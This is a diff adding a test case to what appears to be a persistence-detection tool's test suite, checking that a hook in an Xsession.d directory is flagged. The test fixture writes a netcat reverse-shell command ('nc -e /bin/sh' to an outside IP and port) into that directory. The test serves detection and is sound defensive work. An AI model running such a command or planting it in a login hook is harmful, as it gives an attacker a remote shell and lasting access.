@@ -229,3 +229,22 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in Xsession.d fragment: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
+    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks nc reverse-
+    # shell variant INVARIANTs across the brain. Lock the netcat axis
+    # on the X-session-start root/user-exec persistence surface
+    # (T1546 — Xsession.d fragments run AS THE LOGGING-IN USER on
+    # every graphical login; on a single-user workstation that user
+    # IS the operator with sudo access).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/90benign"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
